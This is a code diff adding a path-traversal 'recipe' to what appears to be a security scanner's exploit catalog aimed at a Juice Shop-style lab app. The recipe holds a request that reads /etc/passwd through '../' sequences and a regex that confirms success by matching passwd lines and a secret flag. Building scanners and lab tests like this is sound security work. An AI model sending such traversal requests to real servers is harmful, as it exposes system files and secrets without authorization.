@@ -50,6 +50,31 @@ export const RECIPES = {
     },
     dedupe_key: 'sqli_user_login_email_bypass',
     provenance: 'real_scan'
+  },
+  R3: {
+    id: 'R3',
+    title: 'Path Traversal / Arbitrary File Read via Download Endpoint',
+    category: 'path_traversal',
+    scanner_risk: 'high',
+    method: 'GET',
+    url: '/rest/file/download?file=../../../../etc/passwd',
+    route_template: '/rest/file/download',
+    param: 'file',
+    param_location: 'query',
+    evidence: 'Server leaked sensitive /etc/passwd contents and JUICE_SECRET_FLAG via directory traversal parameter.',
+    exploit_request: {
+      method: 'GET',
+      url: '/rest/file/download?file=../../../../etc/passwd',
+      headers: { 'Accept': 'text/plain, application/json' },
+      body: null
+    },
+    exploit_oracle: {
+      success_status: [200],
+      success_body_regex: '(root:x:0:0:|daemon:|juice-admin|JUICE_SECRET_FLAG)',
+      success_header_regex: null
+    },
+    dedupe_key: 'path_traversal_file_download',
+    provenance: 'real_scan'
   }
 };
 
